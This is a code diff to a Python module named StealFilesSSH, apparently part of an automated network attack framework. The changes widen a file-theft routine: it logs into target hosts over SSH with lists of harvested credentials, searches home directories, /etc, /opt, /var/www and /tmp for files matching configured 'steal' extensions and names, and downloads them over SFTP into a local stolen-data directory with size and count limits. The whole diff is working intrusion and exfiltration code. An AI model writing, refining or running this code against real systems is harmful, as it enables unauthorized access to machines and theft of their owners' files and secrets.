@@ -30,6 +30,7 @@ class StealFilesSSH:
             self.shared_data = shared_data
             self.sftp_connected = False
             self.stop_execution = False
+            self.b_parent_action = b_parent  # Set the parent action attribute
             logger.info("StealFilesSSH initialized")
         except Exception as e:
             logger.error(f"Error during initialization: {e}")
@@ -51,10 +52,24 @@ class StealFilesSSH:
     def find_files(self, ssh, dir_path):
         """
         Find files in the remote directory based on the configuration criteria.
+        Limited to specific depth and file size to avoid downloading entire directories.
         """
         try:
-            stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -type f')
+            # Limit search depth to avoid going too deep into directory structure
+            max_depth = 3
+            max_file_size = 10 * 1024 * 1024  # 10MB limit per file
+            max_total_files = 50  # Maximum number of files to steal
+            
+            # Build a more targeted find command with size and depth limits
+            find_cmd = (
+                f'find {dir_path} -maxdepth {max_depth} -type f '
+                f'-size -{max_file_size}c 2>/dev/null | head -200'
+            )
+            
+            logger.info(f"Searching for files in {dir_path} (max depth: {max_depth}, max size: {max_file_size/1024/1024}MB)")
+            stdin, stdout, stderr = ssh.exec_command(find_cmd)
             files = stdout.read().decode().splitlines()
+            
             matching_files = []
             ext_match_count = 0
             name_match_count = 0
@@ -65,11 +80,39 @@ class StealFilesSSH:
                 if self.shared_data.orchestrator_should_exit:
                     logger.info("File search interrupted.")
                     return []
+                
+                # Stop if we have enough files
+                if len(matching_files) >= max_total_files:
+                    logger.info(f"Reached maximum file limit ({max_total_files}), stopping search")
+                    break
 
-                ext_match = any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions)
-                name_match = any(file_name in file for file_name in self.shared_data.steal_file_names)
+                # Check file extension matches
+                ext_match = any(file.lower().endswith(ext.lower()) for ext in self.shared_data.steal_file_extensions)
+                
+                # Check filename matches (more specific - must contain the exact name)
+                name_match = any(file_name.lower() in os.path.basename(file).lower() for file_name in self.shared_data.steal_file_names)
+                
+                # Skip common system/log files that might match extensions
+                skip_patterns = [
+                    '/var/log/', '/proc/', '/sys/', '/dev/', '/tmp/systemd-',
+                    '/run/', '/.cache/', '/snap/', '/boot/', '/lib/',
+                    '/usr/share/', '/usr/lib/', '/etc/systemd/'
+                ]
+                
+                if any(pattern in file for pattern in skip_patterns):
+                    continue
 
                 if ext_match or name_match:
+                    # Additional validation - check if file looks interesting
+                    basename = os.path.basename(file)
+                    
+                    # Skip very generic config files unless specifically named
+                    if ext_match and not name_match:
+                        # Skip files that are likely system configs
+                        generic_names = ['default', 'common', 'main', 'base', 'system', 'global']
+                        if any(generic in basename.lower() for generic in generic_names) and len(basename) < 15:
+                            continue
+                    
                     matching_files.append(file)
                     if ext_match:
                         ext_match_count += 1
@@ -82,7 +125,7 @@ class StealFilesSSH:
                         if name_match:
                             reasons.append("name")
                         sample_matches.append(f"{file} ({'/'.join(reasons)})")
-                elif len(sample_non_matches) < 5:
+                elif len(sample_non_matches) < 3:  # Reduced sample size
                     sample_non_matches.append(file)
 
             display_dir = dir_path if dir_path == '/' else dir_path.rstrip('/') + '/'
@@ -91,9 +134,10 @@ class StealFilesSSH:
                 f"(scanned {len(files)}, extension matches {ext_match_count}, name matches {name_match_count})"
             )
             if sample_matches:
-                logger.debug(f"Sample matched files: {'; '.join(sample_matches)}")
+                logger.info(f"Sample matched files: {'; '.join(sample_matches)}")
             elif sample_non_matches:
-                logger.debug(f"Sample scanned files (no match): {'; '.join(sample_non_matches)}")
+                logger.debug(f"Sample scanned files (no match): {'; '.join(sample_non_matches[:3])}")
+            
             return matching_files
         except Exception as e:
             logger.error(f"Error finding files in directory {dir_path}: {e}")
@@ -118,20 +162,44 @@ class StealFilesSSH:
     def steal_file(self, ssh, remote_file, local_dir):
         """
         Download a file from the remote server to the local directory.
+        Includes size checking and progress logging.
         """
         try:
             sftp = ssh.open_sftp()
             self.sftp_connected = True  # Mark SFTP as connected
+            
+            # Check file size before downloading
+            try:
+                file_stat = sftp.stat(remote_file)
+                file_size = file_stat.st_size
+                max_size = 10 * 1024 * 1024  # 10MB limit
+                
+                if file_size > max_size:
+                    logger.warning(f"Skipping {remote_file}: file too large ({file_size/1024/1024:.1f}MB > {max_size/1024/1024}MB)")
+                    sftp.close()
+                    return False
+                    
+                logger.info(f"Downloading {os.path.basename(remote_file)} ({file_size/1024:.1f}KB)")
+            except Exception as stat_error:
+                logger.warning(f"Could not get file size for {remote_file}: {stat_error}")
+            
             remote_dir = os.path.dirname(remote_file)
             local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
             os.makedirs(local_file_dir, exist_ok=True)
             local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
+            
+            # Download the file
             sftp.get(remote_file, local_file_path)
-            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
+            logger.success(f"Downloaded {remote_file} -> {local_file_path}")
             sftp.close()
+            return True
         except Exception as e:
             logger.error(f"Error stealing file {remote_file}: {e}")
-            raise
+            try:
+                sftp.close()
+            except:
+                pass
+            return False
 
     def execute(self, ip, port, row, status_key):
         """
@@ -173,31 +241,78 @@ class StealFilesSSH:
 
                 # Attempt to steal files using each credential
                 success = False
+                total_downloaded = 0
+                
                 for username, password in credentials:
                     if self.stop_execution or self.shared_data.orchestrator_should_exit:
                         logger.info("File search interrupted.")
                         break
                     try:
-                        logger.info(f"Trying credential {username}:{password} for {ip}")
+                        logger.info(f"Trying credential {username} for {ip}")
                         ssh = self.connect_ssh(ip, username, password)
-                        home_dir = self._get_remote_home(ssh, username)
-                        logger.info(f"Searching for target files under {home_dir} on {ip}")
-                        remote_files = self.find_files(ssh, home_dir)
+                        
+                        # Search in multiple targeted directories instead of just home
+                        search_dirs = [
+                            self._get_remote_home(ssh, username),
+                            '/etc',
+                            '/opt',
+                            '/var/www',
+                            '/tmp'
+                        ]
+                        
                         mac = row['MAC Address']
                         local_dir = os.path.join(self.shared_data.datastolendir, f"ssh/{mac}_{ip}")
-                        if remote_files:
-                            for remote_file in remote_files:
+                        
+                        all_remote_files = []
+                        
+                        for search_dir in search_dirs:
+                            if self.stop_execution or self.shared_data.orchestrator_should_exit:
+                                logger.info("File search interrupted.")
+                                break
+                                
+                            logger.info(f"Searching in {search_dir} on {ip}")
+                            try:
+                                remote_files = self.find_files(ssh, search_dir)
+                                all_remote_files.extend(remote_files)
+                                logger.info(f"Found {len(remote_files)} files in {search_dir}")
+                            except Exception as dir_error:
+                                logger.warning(f"Could not search {search_dir}: {dir_error}")
+                                continue
+                        
+                        # Remove duplicates
+                        all_remote_files = list(set(all_remote_files))
+                        
+                        if all_remote_files:
+                            logger.info(f"Total unique files found: {len(all_remote_files)}")
+                            downloaded_count = 0
+                            
+                            for remote_file in all_remote_files:
                                 if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                                    logger.info("File search interrupted.")
+                                    logger.info("File download interrupted.")
                                     break
-                                self.steal_file(ssh, remote_file, local_dir)
-                            success = True
-                            countfiles = len(remote_files)
-                            logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
+                                    
+                                if self.steal_file(ssh, remote_file, local_dir):
+                                    downloaded_count += 1
+                                    total_downloaded += 1
+                                    
+                                # Progress update every 10 files
+                                if downloaded_count % 10 == 0:
+                                    logger.info(f"Downloaded {downloaded_count}/{len(all_remote_files)} files so far...")
+                            
+                            if downloaded_count > 0:
+                                success = True
+                                logger.success(f"Successfully downloaded {downloaded_count} files from {ip} using {username}")
+                            else:
+                                logger.warning(f"No files could be downloaded from {ip} using {username}")
+                        else:
+                            logger.warning(f"No matching files found on {ip} using {username}")
+                            
                         ssh.close()
+                        
                         if success:
                             timer.cancel()  # Cancel the timer if the operation is successful
                             return 'success'  # Return success if the operation is successful
+                            
                     except Exception as e:
                         logger.error(f"Error stealing files from {ip} with username {username}: {e}")
 
